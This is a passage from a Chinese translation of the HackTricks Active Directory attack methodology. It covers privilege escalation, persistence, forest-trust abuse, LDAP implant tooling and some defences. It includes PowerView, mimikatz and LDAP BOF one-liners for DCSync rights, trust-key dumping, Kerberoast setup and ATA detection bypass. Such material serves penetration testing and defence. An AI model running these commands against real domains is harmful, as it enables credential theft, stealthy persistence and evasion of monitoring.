constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

对远程计算机的 Active Directory 对象拥有 **WRITE** 权限，可以通过**提升的权限**实现代码执行：


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### 权限/ACL 滥用

被攻陷的用户可能对某些域对象拥有一些**有用的权限**，使你能够进行横向**移动**/**提升**权限。


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler 服务滥用

发现域内存在**监听中的 Spool 服务**后，可以滥用它来**获取新凭据**并**提升权限**。


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### 第三方会话滥用

如果**其他用户****访问**被**攻陷**的计算机，就有可能**从内存中收集凭据**，甚至向其进程中**注入 beacon** 来冒充他们。\
用户通常会通过 RDP 访问系统，因此下面介绍了如何对第三方 RDP 会话执行一些攻击：


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** 提供了一个用于管理加入域的计算机上的**本地 Administrator 密码**的系统，确保密码是**随机化**、唯一且经常**更改**的。这些密码存储在 Active Directory 中，并通过 ACL 控制访问权限，仅允许授权用户访问。拥有足够权限访问这些密码后，就可以 pivot 到其他计算机。


{{#ref}}
laps.md
{{#endref}}

### 证书窃取

从被攻陷的计算机中**收集证书**可能是提升环境内权限的一种方式：


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### 证书模板滥用

如果配置了**存在漏洞的模板**，就可以滥用它们来提升权限：


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## 使用高权限账户进行 Post-exploitation

### 导出域凭据

获得 **Domain Admin**，或更理想的 **Enterprise Admin** 权限后，你可以**导出** **域数据库**：_ntds.dit_。

[**有关 DCSync attack 的更多信息请见此处**](dcsync.md)。

[**有关如何窃取 NTDS.dit 的更多信息请见此处**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### 将 Privesc 用作持久化

前面讨论的一些技术可以用于持久化。\
例如，你可以：

- 使用户易受 [**Kerberoast**](kerberoast.md) 攻击

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- 使用户易受 [**ASREPRoast**](asreproast.md) 攻击

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- 向用户授予 [**DCSync**](#dcsync) 权限

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack** 通过使用 **NTLM hash**（例如 **PC 账户的 hash**），为特定服务创建一个**合法的 Ticket Granting Service (TGS) ticket**。这种方法用于**访问服务权限**。


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** 是指攻击者在 Active Directory (AD) 环境中获取 **krbtgt 账户的 NTLM hash**。该账户非常特殊，因为它用于签署所有 **Ticket Granting Tickets (TGTs)**，而 TGT 是在 AD 网络内进行身份验证所必需的。

获得该 hash 后，攻击者可以为其选择的任意账户创建 **TGT**（Silver ticket attack）。


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

这类 ticket 类似于以一种能够**绕过常见 Golden Ticket 检测机制**的方式伪造的 Golden Ticket。


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**拥有账户的证书或能够请求这些证书**，是实现用户账户持久化的非常好的一种方式（即使用户更改了密码）：


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**使用证书也可以在域内以高权限实现持久化：**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory 中的 **AdminSDHolder** 对象通过在这些**特权组**（如 Domain Admins 和 Enterprise Admins）之间应用标准的**访问控制列表 (ACL)**，确保其安全性并防止未经授权的更改。然而，此功能也可能被利用；如果攻击者修改 AdminSDHolder 的 ACL，向普通用户授予完全访问权限，该用户就能广泛控制所有特权组。这项原本用于保护的安全措施可能因此适得其反，允许未经授权的访问，除非对其进行密切监控。

[**有关 AdminDSHolder Group 的更多信息。**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM 凭据

每个 **Domain Controller (DC)** 内都存在一个**本地 administrator** 账户。获得此类计算机的管理员权限后，可以使用 **mimikatz** 提取本地 Administrator hash。随后还需要修改注册表以**启用该密码的使用**，从而允许远程访问本地 Administrator 账户。


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL 持久化

你可以向某个**用户**授予其针对特定域对象的一些**特殊权限**，使该用户能够在**未来提升权限**。


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### 安全描述符

**安全描述符**用于**存储**某个**对象**对另一个**对象**所拥有的**权限**。如果你能够对对象的**安全描述符**进行哪怕**很小的修改**，就可以在无需成为特权组成员的情况下，获得针对该对象的非常有用的权限。


{{#ref}}
security-descriptors.md
{{#endref}}

### 动态对象反取证 / Evasion

滥用 `dynamicObject` auxiliary class，结合 `entryTTL`/`msDS-Entry-Time-To-Die` 创建生命周期短暂的 principals/GPOs/DNS 记录；它们会自行删除且不留下 tombstones，从而擦除 LDAP 证据，同时留下孤立的 SID、损坏的 `gPLink` 引用或缓存的 DNS 响应（例如 AdminSDHolder ACE 污染，或恶意的 `gPCFileSysPath`/AD-integrated DNS 重定向）。

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

修改内存中的 **LSASS** 以建立一个**通用密码**，从而授予对所有域账户的访问权限。


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[在此了解 SSP (Security Support Provider) 是什么。](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
你可以创建**自己的 SSP**，以**明文**捕获用于访问计算机的**凭据**。


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

它会在 AD 中注册一个**新的 Domain Controller**，并使用它向指定对象**推送属性**（SIDHistory、SPNs……），而不会留下任何有关**修改**的**日志**。你**需要 DA** 权限，并且必须位于**根域**中。\
请注意，如果使用了错误的数据，将会出现非常难看的日志。


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS 持久化

之前我们讨论过，在拥有**足够权限读取 LAPS 密码**时如何提升权限。然而，这些密码也可以用于**维持持久化**。\
参见：


{{#ref}}
laps.md
{{#endref}}

## Forest 权限提升 - Domain Trusts

Microsoft 将 **Forest** 视为安全边界。这意味着，**攻陷单个域可能导致整个 Forest 被攻陷**。<sup>[[1]](#references)</sup>

### 基本信息

[**Domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) 是一种安全机制，允许一个**域**中的用户访问另一个**域**中的资源。它本质上是在两个域的身份验证系统之间建立连接，使身份验证验证能够无缝传递。当域建立 trust 时，它们会在各自的 **Domain Controllers (DCs)** 中交换并保留特定的 **keys**，这些 key 对 trust 的完整性至关重要。

在典型场景中，如果用户想要访问**受信任域**中的服务，必须先从其自身域的 DC 请求一个称为 **inter-realm TGT** 的特殊 ticket。此 TGT 使用两个域共同约定的共享 **key** 加密。随后，用户将该 TGT 提交给**受信任域的 DC**，以获取服务 ticket（**TGS**）。受信任域的 DC 成功验证 inter-realm TGT 后，会发放一个 TGS，授予用户访问该服务的权限。

**步骤**：

1. **Domain 1** 中的**客户端计算机**使用其 **NTLM hash** 向其 **Domain Controller (DC1)** 请求 **Ticket Granting Ticket (TGT)**，从而开始该过程。
2. 如果客户端成功通过身份验证，DC1 会发放一个新的 TGT。
3. 客户端随后向 DC1 请求 **inter-realm TGT**，该 ticket 用于访问 **Domain 2** 中的资源。
4. 作为双向 domain trust 的一部分，inter-realm TGT 使用 DC1 和 DC2 之间共享的 **trust key** 加密。
5. 客户端将 inter-realm TGT 发送给 **Domain 2 的 Domain Controller (DC2)**。
6. DC2 使用共享的 trust key 验证 inter-realm TGT；如果有效，则为客户端希望访问的 Domain 2 中的服务器发放 **Ticket Granting Service (TGS)**。
7. 最后，客户端将此 TGS 提交给服务器。该 TGS 使用服务器账户的 hash 加密，以获取对 Domain 2 中服务的访问权限。

### 不同的 trusts

需要注意的是，**trust 可以是单向或双向的**。在双向选项中，两个域彼此信任；而在**单向** trust 关系中，一个域是**受信任域**，另一个是**信任域**。在后一种情况下，**你只能从受信任域访问信任域中的资源**。

如果 Domain A trusts Domain B，则 A 是信任域，B 是受信任域。此外，在 **Domain A** 中，这属于 **Outbound trust**；而在 **Domain B** 中，这属于 **Inbound trust**。

**不同的 trusting relationships**

- **Parent-Child Trusts**：这是同一 forest 中的常见设置，子域会自动与其父域建立双向可传递 trust。实际上，这意味着身份验证请求可以在父域与子域之间无缝传递。
- **Cross-link Trusts**：也称为 "shortcut trusts"，建立在子域之间，用于加快 referral 过程。在复杂的 forest 中，身份验证 referral 通常必须先向上到达 forest root，然后再向下到达目标域。通过创建 cross-links，可以缩短这一过程，这在地理位置分散的环境中特别有用。
- **External Trusts**：这些 trust 建立在不同且互不相关的域之间，本质上不可传递。根据 [Microsoft 的文档](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)，external trusts 用于访问当前 forest 之外、且未通过 forest trust 连接的域中的资源。external trusts 通过 SID filtering 增强安全性。
- **Tree-root Trusts**：这些 trust 会在 forest root domain 与新添加的 tree root 之间自动建立。虽然不常见，但 tree-root trusts 对向 forest 添加新的域树非常重要，使其能够保留唯一的域名并确保双向可传递性。更多信息请参见 [Microsoft 的指南](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>)。
- **Forest Trusts**：这种 trust 是两个 forest root domains 之间的双向可传递 trust，同时也会强制执行 SID filtering 以增强安全措施。
- **MIT Trusts**：这些 trust 与非 Windows、符合 [RFC4120](https://tools.ietf.org/html/rfc4120) 的 Kerberos 域建立。MIT trusts 更为专用，适用于需要与 Windows 生态系统之外的基于 Kerberos 的系统集成的环境。

#### **trusting relationships** 的其他区别

- trust relationship 也可以是**可传递的**（A trust B，B trust C，则 A trust C）或**不可传递的**。
- trust relationship 可以设置为**双向 trust**（双方互相信任）或**单向 trust**（只有一方信任另一方）。

### 攻击路径

1. **枚举** trusting relationships
2. 检查是否有任何**安全主体**（用户/组/计算机）可以**访问** **另一个域**中的资源，例如通过 ACE 条目，或因为其属于另一个域中的组。寻找**跨域关系**（这可能正是创建 trust 的原因）。
1. 在此情况下，kerberoast 也可能是另一种选择。
3. **攻陷**能够通过域进行**pivot**的**账户**。

攻击者可以通过以下三种主要机制访问另一个域中的资源：

- **本地组成员身份**：安全主体可能会被添加到计算机上的本地组中，例如服务器上的“Administrators”组，从而获得对该计算机的重大控制权。
- **外部域组成员身份**：安全主体也可以是 foreign domain 中组的成员。不过，这种方式的有效性取决于 trust 的性质和组的范围。
- **访问控制列表 (ACL)**：安全主体可能会被指定在 **ACL** 中，尤其是作为 **DACL** 内 **ACEs** 中的实体，从而获得对特定资源的访问权限。若想深入了解 ACL、DACL 和 ACE 的工作机制，标题为 “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” 的白皮书是非常有价值的资源。<sup>[[17]](#references)</sup>

### 查找拥有权限的外部用户/组

你可以检查 **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`**，以查找域中的 foreign security principals。这些对象将是来自**外部域/forest**的用户/组。

你可以在 **Bloodhound** 中检查，或使用 powerview：
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### 子域到父域 forest 权限提升
```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
枚举域信任关系的其他方法：
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> 存在 **2 个受信任密钥**，一个用于 _Child --> Parent_，另一个用于 _Parent_ --> _Child_。\
> 你可以使用以下命令获取当前域使用的密钥：
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

利用 SID-History injection，通过 trust 提权为 child/parent domain 的 Enterprise admin：


{{#ref}}
sid-history-injection.md
{{#endref}}

#### 利用可写 Configuration NC

了解如何利用 Configuration Naming Context (NC) 至关重要。在 Active Directory (AD) 环境中，Configuration NC 充当整个 forest 的配置数据中央存储库。这些数据会复制到 forest 内的每个 Domain Controller (DC)，其中可写 DC 会维护 Configuration NC 的可写副本。要利用这一点，必须在 DC 上拥有 **SYSTEM 权限**，最好是 child DC。

**将 GPO 链接到 root DC site**

Configuration NC 的 Sites 容器包含 AD forest 中所有已加入域的计算机的 site 信息。攻击者在任意 DC 上以 SYSTEM 权限运行时，可以将 GPO 链接到 root DC site。通过操纵应用于这些 site 的策略，此操作可能危害 root domain。

如需深入了解，可以研究 [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)。<sup>[[12]](#references)</sup>

**Compromise any gMSA in the forest**

一种攻击路径是针对 domain 中的特权 gMSA。用于计算 gMSA 密码的 KDS Root key 存储在 Configuration NC 中。在任意 DC 上拥有 SYSTEM 权限后，便可以访问 KDS Root key，并计算 forest 中任意 gMSA 的密码。

详细分析和分步指南请参阅：


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

补充的 delegated MSA attack（BadSuccessor – abusing migration attributes）：


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

其他外部研究：[Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)。<sup>[[13]](#references)</sup>

**Schema change attack**

此方法需要耐心等待新的特权 AD objects 创建完成。攻击者拥有 SYSTEM 权限后，可以修改 AD Schema，使任意用户获得对所有 classes 的完全控制权。这可能导致对新创建 AD objects 的未授权访问和控制。

更多信息请参阅 [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)。<sup>[[14]](#references)</sup>

**From DA to EA with ADCS ESC5**

ADCS ESC5 vulnerability 针对 Public Key Infrastructure (PKI) objects 的控制权，创建一个允许以 forest 中任意用户身份进行 authentication 的 certificate template。由于 PKI objects 位于 Configuration NC 中，攻陷可写 child DC 后即可执行 ESC5 attacks。

更多详情请参阅 [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)。<sup>[[15]](#references)</sup> 在缺少 ADCS 的场景中，攻击者可以搭建所需组件，相关内容请参阅 [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)。<sup>[[16]](#references)</sup>

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
在此场景中，**你的域受到外部域的信任**，该外部域向你授予了对其的**未确定权限**。你需要找出**你域中的哪些 principals 对外部域拥有何种访问权限**，然后尝试利用这些权限：


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### 外部 Forest Domain - 单向（Outbound）
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
在此场景中，**你的域**正在向来自**不同域**的主体授予某些**权限**。

然而，当一个**域被信任域**信任时，被信任域会创建一个具有**可预测名称**的用户，并将**被信任密码**用作其**密码**。这意味着，可以**访问信任域中的某个用户，以进入被信任域**，对其进行枚举，并尝试进一步提升权限：


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

另一种入侵被信任域的方法，是找到一个创建于域信任**相反方向**的 [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links)（这种情况并不常见）。

另一种入侵被信任域的方法，是在一台**被信任域用户可以访问**的机器上等待该用户通过 **RDP** 登录。随后，攻击者可以向 RDP 会话进程中注入代码，并从那里**访问受害者的源域**。\
此外，如果**受害者挂载了其硬盘**，攻击者可以从 **RDP 会话**进程中将**后门**写入**该硬盘的启动文件夹**。此技术称为 **RDPInception。**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- 利用跨 forest trust 的 SID history 属性发起攻击的风险，可以通过 SID Filtering 缓解；该功能默认在所有 inter-forest trust 上启用。这一措施基于以下假设：intra-forest trust 是安全的，因为按照 Microsoft 的立场，安全边界是 forest，而不是 domain。
- 然而，这里存在一个问题：SID filtering 可能会影响应用程序和用户访问，因此有时会被停用。

### **Selective Authentication:**

- 对于 inter-forest trust，使用 Selective Authentication 可以确保来自两个 forest 的用户不会被自动验证。相反，用户必须获得明确的权限，才能访问 trusting domain 或 forest 中的 domain 和 server。
- 需要注意的是，这些措施无法防护对可写 Configuration Naming Context (NC) 的利用，也无法防护针对 trust account 的攻击。

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## LDAP-based AD Abuse from On-Host Implants

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) 将 bloodyAD 风格的 LDAP primitives 重新实现为 x64 Beacon Object Files，可完全在 on-host implant（例如 Adaptix C2）内部运行。Operators 使用 `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` 编译该 pack，加载 `ldap.axs`，然后从 beacon 中调用 `ldap <subcommand>`。所有流量都通过当前 logon security context，经由带 signing/sealing 的 LDAP (389)，或经由启用自动 certificate trust 的 LDAPS (636) 传输，因此不需要 socks proxies 或磁盘 artifacts。<sup>[[4]](#references)</sup>

### Implant-side LDAP enumeration

- `get-users`、`get-computers`、`get-groups`、`get-usergroups` 和 `get-groupmembers` 将短名称/OU 路径解析为完整 DN，并导出相应对象。
- `get-object`、`get-attribute` 和 `get-domaininfo` 从 `rootDSE` 获取任意 attributes（包括 security descriptors）以及 forest/domain metadata。
- `get-uac`、`get-spn`、`get-delegation` 和 `get-rbcd` 直接从 LDAP 中公开 roasting candidates、delegation settings，以及现有的 [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors。
- `get-acl` 和 `get-writable --detailed` 解析 DACL，列出 trustees、rights（GenericAll/WriteDACL/WriteOwner/attribute writes）以及 inheritance，从而立即识别 ACL privilege escalation 的目标。
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### 用于提权与持久化的 LDAP 写入原语

- 对象创建 BOF（`add-user`、`add-computer`、`add-group`、`add-ou`）允许 operator 在拥有 OU 权限的任意位置准备新的 principal 或 machine account。找到 write-property 权限后，`add-groupmember`、`set-password`、`add-attribute` 和 `set-attribute` 可直接劫持目标。
- 以 ACL 为重点的命令，如 `add-ace`、`set-owner`、`add-genericall`、`add-genericwrite` 和 `add-dcsync`，可将任意 AD 对象上的 WriteDACL/WriteOwner 转化为密码重置、组成员控制或 DCSync replication 权限，且不会留下 PowerShell/ADSI artifacts。对应的 `remove-*` 命令可清理注入的 ACE。

### Delegation、roasting 与 Kerberos abuse

- `add-spn`/`set-spn` 可立即使被 compromized 的用户具备 Kerberoast 条件；`add-asreproastable`（UAC toggle）可在不接触密码的情况下将其标记为 AS-REP roasting 目标。
- Delegation macros（`add-delegation`、`set-delegation`、`add-constrained`、`add-unconstrained`、`add-rbcd`）会从 beacon 重写 `msDS-AllowedToDelegateTo`、UAC flags 或 `msDS-AllowedToActOnBehalfOfOtherIdentity`，从而启用 constrained/unconstrained/RBCD attack paths，并消除对 remote PowerShell 或 RSAT 的需求。

### sidHistory injection、OU relocation 与 attack surface shaping

- `add-sidhistory` 会将 privileged SIDs 注入受控 principal 的 SID history（参见 [SID-History Injection](sid-history-injection.md)），通过 LDAP/LDAPS 完成隐蔽的 access inheritance。
- `move-object` 会更改 computers 或 users 的 DN/OU，使 attacker 能够先将 assets 拖入已存在 delegated rights 的 OUs，然后 abuse `set-password`、`add-groupmember` 或 `add-spn`。
- 严格限定范围的 removal commands（`remove-attribute`、`remove-delegation`、`remove-rbcd`、`remove-uac`、`remove-groupmember` 等）允许 operator 在 harvest credentials 或建立 persistence 后快速 rollback，从而尽量减少 telemetry。

## AD -> Azure 与 Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## 一些通用防御措施

[**在此了解更多关于如何保护 credentials 的信息。**](../stealing-credentials/credentials-protections.md)

### **Credential Protection 的防御措施**

- **Domain Admins 限制**：建议仅允许 Domain Admins 登录 Domain Controllers，避免在其他 hosts 上使用其权限。
- **Service Account 权限**：Services 不应使用 Domain Admin（DA）权限运行，以维护安全性。
- **Temporal Privilege Limitation**：对于需要 DA 权限的 tasks，应限制其持续时间。可通过以下方式实现：`Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**：审计 Event IDs 2889/3074/3075，然后在 DCs/clients 上强制启用 LDAP signing 和 LDAPS channel binding，以阻止 LDAP MITM/relay attempts。

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Impacket activity 的 Protocol-level fingerprinting

如果想检测常见的 AD tradecraft，**不要只依赖 operator 可控的 artifacts**，例如重命名的 binaries、service names、temp batch files 或 output paths。应建立合法 Windows clients 构建 [Kerberos](kerberos-authentication.md)、[NTLM](../ntlm/README.md)、SMB、LDAP、DCE/RPC 和 WMI traffic 的 baseline，然后寻找即使 operator 修改了 `psexec.py`、`wmiexec.py`、`dcomexec.py`、`atexec.py` 或 `ntlmrelayx.py` 仍会保留的 **implementation quirks**。<sup>[[8]](#references)</sup>

- **高置信度的 standalone candidates**（根据自身 baseline 验证后）：
- 使用 `auth_context_id = 79231 + ctx_id` 的 Authenticated DCE/RPC
- 使用 `0xff` 填充 DCE/RPC authentication padding
- LDAP Kerberos binds 将原始 Kerberos `AP-REQ` 直接置于 SPNEGO `mechToken` 中
- 带有类似 ASCII 的 `ClientGuid` 值的 SMB2/3 negotiate requests
- WMI `IWbemLevel1Login::NTLMLogin` 使用非标准 namespace `//./root/cimv2`
- Hardcoded Kerberos nonce values
- **更适合作为 correlation/scoring features**：
- 稀疏或重复的 Kerberos etype lists、异常或缺失的 `PA-DATA`，或不同于 native Windows 的 TGS-REQ etype ordering
- 缺少 version info 的 NTLM Type 1 messages，或 host names 为 null 的 Type 3 messages
- DCE/RPC 中携带 raw NTLMSSP 而非 SPNEGO、缺少 DCE/RPC verification trailers，或 SPNEGO/Kerberos OID mismatches
- 来自同一 host/user/session/time window 的多个此类 traits，其可信度远高于任何单个 weak field
- **用作 enrichment，而非 standalone alerts**：
- Default filenames、output paths、random service names、temporary batch names、default computer account names，以及 tool-specific HTTP/WebDAV/RDP/MSSQL strings
- 这些内容很容易被 operators 更改，最适合用于说明为何某个 cross-protocol cluster 可疑
- **Operational notes**：
- 部分 signals 需要 decrypted traffic、[PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md)、ETW 或 service-side visibility
- 在将其提升为 alerts 前，应使用 Samba/Linux clients、appliances 和 legacy software 进行验证
- 随着对 baseline 置信度的提升，将 detections 从 enrichment -> hunting -> alerting 逐步提升

### **Implementing Deception Techniques**

- Implementing deception 包括设置 traps，例如 decoy users 或 computers，并为其设置不会过期的 passwords，或将其标记为 Trusted for Delegation。详细方法包括创建具有特定 rights 的 users，或将其加入 high privilege groups。<sup>[[2]](#references)</sup>
- 一个实际示例是使用以下 tools：`Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- 关于部署 deception techniques 的更多信息，请参见 [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception)。

### **Identifying Deception**

- **对于 User Objects**：可疑 indicators 包括 atypical ObjectSID、低频 logons、creation dates 和较低的 bad password counts。
- **General Indicators**：将潜在 decoy objects 的 attributes 与真实 objects 的 attributes 进行比较，可以发现 inconsistencies。诸如 [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) 等 tools 可协助识别此类 deceptions。

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**：
- **User Enumeration**：避免在 Domain Controllers 上进行 session enumeration，以防止 ATA detection。
- **Ticket Impersonation**：使用 **aes** keys 创建 tickets，有助于通过不降级到 NTLM 来规避 detection。
- **DCSync Attacks**：建议从非 Domain Controller 执行，以避免 ATA detection；直接从 Domain Controller 执行将触发 alerts。

## References

- [1] [攻击 Domain Trusts 指南](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [在 Active Directory 中伪造 Trusts 进行 Deception](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [从 Domain Admin 到 Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP BOF Collection – 用于 Active Directory Exploitation 的内存中 LDAP Toolkit](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck！将 NTLM Hashes Weaponize 为 Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF（NetExec AD Lab）– Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – 解剖 Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon：通过 Netlogon 接管 Active Directory Accounts](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - 如何管理与 CVE-2020-1472 相关的 Netlogon secure channel connections 变更](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [探索被遗忘的 Null Session 与 MS-RPC interfaces](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [SID filter 作为 domains 之间的 security boundary？（第 4 部分）- Bypass SID filtering research](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [SID filter 作为 domains 之间的 security boundary？（第 5 部分）- Golden GMSA trust attack - 从 child 到 parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [SID filter 作为 domains 之间的 security boundary？（第 6 部分）- Schema change trust attack - 从 child 到 parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [使用 ESC5 从 DA 到 EA](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [通过 abuse AD CS，在 5 分钟内从 child domain's admins 提权至 enterprise admins：后续篇](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [An ACE Up the Sleeve：设计 Active Directory DACL Backdoors](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [NetExec pre2k module source](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema - msDS-GroupMSAMembership attribute](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
{{#include ../../banners/hacktricks-training.md}}
